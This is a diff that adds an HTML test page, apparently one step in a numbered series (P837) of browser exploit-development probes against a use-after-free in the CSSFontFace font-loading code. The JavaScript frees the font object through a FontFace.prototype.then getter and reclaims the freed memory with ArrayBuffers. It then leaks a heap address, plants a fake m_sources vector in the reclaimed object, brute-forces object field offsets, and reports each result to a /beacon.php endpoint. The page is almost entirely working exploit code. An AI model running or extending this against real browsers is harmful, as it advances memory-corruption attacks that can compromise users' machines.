@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P837</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P837: Operation Write Isolation — Which op writes to freed CSSFontFace?</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P837-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexB(b){return ('0'+b.toString(16)).slice(-2);}
+function snap(u8){var a=new Uint8Array(u8.length);a.set(u8);return a;}
+function diffBytes(before,after){
+  var ch=[];
+  for(var i=0;i<before.length;i++){
+    if(before[i]!==after[i]) ch.push('+'+hexB(i)+'='+hexB(before[i])+'->'+hexB(after[i]));
+  }
+  return ch.length?ch.join('|'):'(none)';
+}
+function nzMap(u8){
+  var r=[];
+  for(var i=0;i<u8.length;i++) if(u8[i]!==0) r.push('+'+hexB(i)+'='+hexB(u8[i]));
+  return r.length?r.join('|'):'(all-zero)';
+}
+
+bn('BOOT','start');
+log('P837: Operation Write Isolation','info');
+
+/* PHASE A: FontFace UAF + AB(192) reclaim */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('Reclaim missed (nz='+bestNz+'), reloading...','fail');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var u8=new Uint8Array(ab);
+  var bu=new BigUint64Array(ab);
+  var q11=bu[11];
+  var q11lo=Number(q11&0xFFFFFFFFn),q11hi=Number(q11>>32n);
+  var Hstr='unknown';
+  if(q11hi>0){var borrow=(q11lo<0x68)?1:0;Hstr='0x'+(q11hi-borrow).toString(16)+('00000000'+((q11lo-0x68)>>>0).toString(16)).slice(-8);}
+  var baseline=snap(u8);
+
+  bn('HEAP','H='+Hstr+'|nz='+bestNz);
+  log('Phase A: H='+Hstr+' nz='+bestNz,'ok');
+
+  /* ===== PHASE B: Zero AB, then test each operation individually ===== */
+  /* We need to re-trigger UAF for each test since operations may be one-shot.
+     Instead, we'll do them in sequence on the same AB, resetting between each. */
+
+  var results={};
+
+  /* B1: face.load() — confirm P836 finding */
+  for(var i=0;i<192;i++) u8[i]=0;
+  var pre=snap(u8);
+  try{face.load();}catch(e){}
+  var post=snap(u8);
+  results.load=diffBytes(pre,post);
+  bn('B1-LOAD','diff='+results.load);
+  log('B1 face.load(): '+results.load,(results.load==='(none)')?'info':'hot');
+
+  /* B2: document.fonts.add(face) */
+  for(var i=0;i<192;i++) u8[i]=0;
+  pre=snap(u8);
+  try{document.fonts.add(face);}catch(e){results.addErr=e.message;}
+  post=snap(u8);
+  results.add=diffBytes(pre,post);
+  bn('B2-ADD','diff='+results.add+(results.addErr?'|err='+results.addErr:''));
+  log('B2 fonts.add(): '+results.add+(results.addErr?' ERR:'+results.addErr:''),(results.add==='(none)')?'info':'hot');
+
+  /* B3: document.fonts.check() */
+  for(var i=0;i<192;i++) u8[i]=0;
+  pre=snap(u8);
+  var checkResult;
+  try{checkResult=document.fonts.check('1em f1');}catch(e){results.checkErr=e.message;}
+  post=snap(u8);
+  results.check=diffBytes(pre,post);
+  bn('B3-CHECK','diff='+results.check+'|result='+checkResult+(results.checkErr?'|err='+results.checkErr:''));
+  log('B3 fonts.check(): '+results.check+' result='+checkResult,(results.check==='(none)')?'info':'hot');
+
+  /* B4: Render text in font f1 (create element, measure) */
+  for(var i=0;i<192;i++) u8[i]=0;
+  pre=snap(u8);
+  var testEl=document.createElement('span');
+  testEl.style.fontFamily='f1, serif';
+  testEl.style.fontSize='48px';
+  testEl.textContent='ABCDEFGH';
+  document.body.appendChild(testEl);
+  document.body.offsetHeight; /* force layout */
+  var w=testEl.offsetWidth,h=testEl.offsetHeight;
+  post=snap(u8);
+  results.render=diffBytes(pre,post);
+  bn('B4-RENDER','diff='+results.render+'|w='+w+'|h='+h);
+  log('B4 render text: '+results.render+' ('+w+'x'+h+')',(results.render==='(none)')?'info':'hot');
+  testEl.remove();
+
+  /* B5: face.status read */
+  for(var i=0;i<192;i++) u8[i]=0;
+  pre=snap(u8);
+  var statusVal;
+  try{statusVal=face.status;}catch(e){results.statusErr=e.message;}
+  post=snap(u8);
+  results.status=diffBytes(pre,post);
+  bn('B5-STATUS','diff='+results.status+'|val='+statusVal);
+  log('B5 face.status: '+results.status+' val='+statusVal,(results.status==='(none)')?'info':'hot');
+
+  /* B6: face.loaded (promise property) */
+  for(var i=0;i<192;i++) u8[i]=0;
+  pre=snap(u8);
+  var loadedVal;
+  try{loadedVal=typeof face.loaded;}catch(e){results.loadedErr=e.message;}
+  post=snap(u8);
+  results.loaded=diffBytes(pre,post);
+  bn('B6-LOADED','diff='+results.loaded+'|type='+loadedVal);
+  log('B6 face.loaded: '+results.loaded+' type='+loadedVal,(results.loaded==='(none)')?'info':'hot');
+
+  /* B7: face.family read */
+  for(var i=0;i<192;i++) u8[i]=0;
+  pre=snap(u8);
+  var familyVal;
+  try{familyVal=face.family;}catch(e){results.familyErr=e.message;}
+  post=snap(u8);
+  results.family=diffBytes(pre,post);
+  bn('B7-FAMILY','diff='+results.family+'|val='+familyVal);
+  log('B7 face.family: '+results.family+' val="'+familyVal+'"',(results.family==='(none)')?'info':'hot');
+
+  /* ===== PHASE C: Async operations — wait for timers/promises ===== */
+  log('','');
+  log('--- Phase C: Async captures (100ms intervals) ---','hot');
+
+  for(var i=0;i<192;i++) u8[i]=0;
+  var asyncBase=snap(u8);
+  /* Re-add face to trigger async font loading paths */
+  try{document.fonts.add(face);}catch(e){}
+  /* Create text that needs this font */
+  var asyncEl=document.createElement('div');
+  asyncEl.style.fontFamily='f1, serif';
+  asyncEl.style.fontSize='32px';
+  asyncEl.textContent='TEST ASYNC FONT LOAD';
+  document.body.appendChild(asyncEl);
+  document.body.offsetHeight;
+
+  var asyncCaptures=[];
+  var asyncIdx=0;
+  var asyncTimes=[0,50,100,200,500,1000];
+
+  function captureAsync(){
+    var cur=snap(u8);
+    var d=diffBytes(asyncBase,cur);
+    if(d!=='(none)'){
+      asyncCaptures.push(asyncTimes[asyncIdx]+'ms:'+d);
+      bn('C-ASYNC-'+asyncTimes[asyncIdx]+'ms','diff='+d);
+      log('  @'+asyncTimes[asyncIdx]+'ms: '+d,'hot');
+      asyncBase=cur; /* track cumulative */
+    }
+    asyncIdx++;
+    if(asyncIdx<asyncTimes.length){
+      setTimeout(captureAsync,asyncTimes[asyncIdx]-asyncTimes[asyncIdx-1]);
+    }else{
+      phaseD();
+    }
+  }
+  captureAsync();
+
+  /* ===== PHASE D: Plant fake m_sources and trigger font resolution ===== */
+  function phaseD(){
+    log('','');
+    log('--- Phase D: Fake m_sources + font resolution ---','hot');
+    asyncEl.remove();
+
+    /* We need to determine the m_sources offset.
+       From source: m_sources is declared after m_featureSettings, m_loadingBehavior.
+       From baseline, q11 (+0x58) and q13 (+0x68) are the only nonzero qwords.
+
+       CSSFontFace layout estimate:
+       +0x00: RefCountedBase (refcount 4B + pad 4B = 8B)
+       +0x08: CanMakeWeakPtr (WeakPtrFactory ~8-16B)
+       +0x18: m_propertiesOrCSSConnection (Variant ~16B)
+       +0x28: m_family (RefPtr 8B)
+       +0x30: m_ranges (Vector 16B)
+       +0x40: m_featureSettings (16B)
+       +0x50: m_loadingBehavior (1B) + padding
+       +0x58: m_sources (Vector: ptr 8B + size 4B + cap 4B = 16B) ← q11 is here!
+       +0x68: m_clients (WeakHashSet) ← q13 is here!
+       +0x78: m_wrapper (WeakPtr 8-16B)
+       +0x88: m_fontSelectionCapabilities
+       +0x??: m_status + bitfields + enums
+       +0xA0-ish: m_timeoutTimer (Timer ~48B)
+       = ~192B total
+    */
+
+    /* Test: if m_sources is at +0x58, setting size at +0x60 to 1 and
+       data ptr at +0x58 to a valid address should make pump() iterate.
+       But we need pump() to be called — that requires font resolution,
+       not face.load() (which P836 showed doesn't traverse). */
+
+    /* First test: set m_sources size=1, data ptr=H (self-referencing),
+       then trigger fonts.check() which should call CSSFontFace::font() → pump() */
+
+    for(var i=0;i<192;i++) u8[i]=0;
+
+    /* Plant m_sources at +0x58: data pointer = H (our AB address) */
+    if(q11hi>0){
+      var borrow2=(q11lo<0x68)?1:0;
+      bu[11]=BigInt((q11hi-borrow2)>>>0)*0x100000000n+BigInt((q11lo-0x68)>>>0); /* H at +0x58 */
+    }
+    /* m_sources size at +0x60 = 1, capacity at +0x64 = 1 */
+    u8[0x60]=1; u8[0x64]=1;
+
+    /* m_status at approximate offset — set to Pending (0) so pump proceeds */
+    /* We don't know exact m_status offset yet. Try several candidates */
+    /* For now, leave all other bytes zero — m_status defaults to 0=Pending which is what pump() needs */
+
+    var preFake=snap(u8);
+    bn('D-PLANTED','src_ptr='+Hstr+'|size=1');
+    log('  Planted: m_sources@+0x58 → H, size=1','info');
+
+    /* Trigger font resolution via fonts.check() */
+    var checkResult2;
+    try{
+      checkResult2=document.fonts.check('1em f1');
+    }catch(e){
+      checkResult2='ERR:'+e.message.slice(0,60);
+    }
+
+    var postFake=snap(u8);
+    var fakeDiff=diffBytes(preFake,postFake);
+    bn('D-CHECK-RESULT','check='+checkResult2+'|diff='+fakeDiff);
+    log('  fonts.check() with fake sources: '+checkResult2,'ok');
+    log('  Diff: '+fakeDiff,(fakeDiff==='(none)')?'info':'hot');
+
+    /* Also try rendering */
+    for(var i=0;i<192;i++) u8[i]=0;
+    if(q11hi>0){
+      var borrow3=(q11lo<0x68)?1:0;
+      bu[11]=BigInt((q11hi-borrow3)>>>0)*0x100000000n+BigInt((q11lo-0x68)>>>0);
+    }
+    u8[0x60]=1; u8[0x64]=1;
+
+    var preRender=snap(u8);
+    var renderEl=document.createElement('span');
+    renderEl.style.fontFamily='f1';
+    renderEl.style.fontSize='32px';
+    renderEl.textContent='X';
+    document.body.appendChild(renderEl);
+    document.body.offsetHeight;
+    var rw=renderEl.offsetWidth,rh=renderEl.offsetHeight;
+    var postRender=snap(u8);
+    var renderDiff=diffBytes(preRender,postRender);
+    bn('D-RENDER','diff='+renderDiff+'|w='+rw+'|h='+rh);
+    log('  Render with fake sources: '+rw+'x'+rh,'ok');
+    log('  Diff: '+renderDiff,(renderDiff==='(none)')?'info':'hot');
+    renderEl.remove();
+
+    phaseE();
+  }
+
+  /* ===== PHASE E: Exhaustive m_status offset search ===== */
+  function phaseE(){
+    log('','');
+    log('--- Phase E: m_status offset search via fonts.check() ---','hot');
+
+    /* Strategy: set different status values at each byte offset,
+       check if fonts.check() behavior changes.
+       Status::Failure=4 should make pump() return 0 immediately.
+       Status::Success=3 should make the font "loaded".
+       If fonts.check() result changes, we found m_status. */
+
+    var found=-1;
+    for(var off=0x80;off<0xC0;off++){
+      /* Zero AB */
+      for(var i=0;i<192;i++) u8[i]=0;
+      /* Set this byte to 4 (Failure) */
+      u8[off]=4;
+      /* Check */
+      var r;
+      try{r=document.fonts.check('1em f1');}catch(e){r='ERR';}
+
+      /* Now set to 3 (Success) */
+      u8[off]=3;
+      var r2;
+      try{r2=document.fonts.check('1em f1');}catch(e){r2='ERR';}
+
+      if(r!==r2||(r!==true&&r!==false)){
+        found=off;
+        bn('E-STATUS-FOUND','off=0x'+hexB(off)+'|fail='+r+'|succ='+r2);
+        log('  STATUS FOUND at +0x'+hexB(off)+': Failure->'+r+' Success->'+r2,'hot');
+        break;
+      }
+    }
+    if(found<0){
+      /* Try lower range */
+      for(var off=0x50;off<0x80;off++){
+        for(var i=0;i<192;i++) u8[i]=0;
+        u8[off]=4;
+        var r;try{r=document.fonts.check('1em f1');}catch(e){r='ERR';}
+        u8[off]=3;
+        var r2;try{r2=document.fonts.check('1em f1');}catch(e){r2='ERR';}
+        if(r!==r2||(r!==true&&r!==false)){
+          found=off;
+          bn('E-STATUS-FOUND','off=0x'+hexB(off)+'|fail='+r+'|succ='+r2);
+          log('  STATUS FOUND at +0x'+hexB(off)+': Failure->'+r+' Success->'+r2,'hot');
+          break;
+        }
+      }
+    }
+    if(found<0){
+      bn('E-STATUS-NOTFOUND','range=0x50-0xBF');
+      log('  m_status not found in range 0x50-0xBF','fail');
+    }
+
+    phaseF();
+  }
+
+  /* ===== PHASE F: Worker + FontFace interaction test ===== */
+  function phaseF(){
+    log('','');
+    log('--- Phase F: Worker FontFace deep test ---','hot');
+
+    var wCode='self.onmessage=function(e){' +
+      'var d=e.data;' +
+      'if(d.cmd==="create-font"){' +
+        'try{' +
+          'var f=new FontFace("wf1","local(Helvetica)",{unicodeRange:"U+0041"});' +
+          'f.load().then(function(){self.postMessage({cmd:"loaded",status:f.status});})' +
+          '.catch(function(e2){self.postMessage({cmd:"load-err",err:e2.message});});' +
+          'self.postMessage({cmd:"created",status:f.status});' +
+        '}catch(e3){self.postMessage({cmd:"create-err",err:e3.message});}' +
+      '}' +
+      'if(d.cmd==="check-fonts"){' +
+        'try{' +
+          'var ok=self.fonts?true:false;' +
+          'self.postMessage({cmd:"fonts-api",hasFonts:ok});' +
+        '}catch(e4){self.postMessage({cmd:"fonts-api",hasFonts:false,err:e4.message});}' +
+      '}' +
+    '};';
+
+    var wkr;
+    try{
+      wkr=new Worker(URL.createObjectURL(new Blob([wCode],{type:'application/javascript'})));
+    }catch(e){
+      bn('F-WORKER','fail='+e.message);
+      log('  Worker: FAIL','fail');
+      phaseSummary();
+      return;
+    }
+
+    var fResults={};
+    var fDone=0;
+    wkr.onmessage=function(e){
+      var d=e.data;
+      fResults[d.cmd]=d;
+      log('  Worker: '+d.cmd+' '+JSON.stringify(d).slice(0,80),'info');
+      fDone++;
+      if(fDone>=3){
+        bn('F-WORKER',JSON.stringify(fResults).slice(0,800));
+        try{wkr.terminate();}catch(e2){}
+        phaseSummary();
+      }
+    };
+    wkr.onerror=function(e){
+      bn('F-WORKER-ERR',e.message);
+      log('  Worker error: '+e.message,'fail');
+      fDone=99;
+      phaseSummary();
+    };
+
+    wkr.postMessage({cmd:'create-font'});
+    wkr.postMessage({cmd:'check-fonts'});
+
+    setTimeout(function(){
+      if(fDone<3){
+        bn('F-WORKER-TIMEOUT','done='+fDone+'|data='+JSON.stringify(fResults).slice(0,400));
+        log('  Worker timeout ('+fDone+' responses)','fail');
+        try{wkr.terminate();}catch(e){}
+        phaseSummary();
+      }
+    },3000);
+  }
+
+  /* ===== SUMMARY ===== */
+  function phaseSummary(){
+    log('','');
+    log('====== P837 RESULTS SUMMARY ======','hot');
+    log('H = '+Hstr,'ok');
+    log('load(): '+results.load,'info');
+    log('fonts.add(): '+results.add,'info');
+    log('fonts.check(): '+results.check,'info');
+    log('render: '+results.render,'info');
+    log('face.status: '+results.status,'info');
+    log('face.loaded: '+results.loaded,'info');
+    log('face.family: '+results.family,'info');
+
+    u8.set(baseline);
+
+    var s='H='+Hstr+'|load='+results.load+'|add='+results.add+'|check='+results.check+'|render='+results.render;
+    bn('DONE',s);
+    log('=== P837 COMPLETE ===','ok');
+  }
+
+},800);
+</script></body></html>
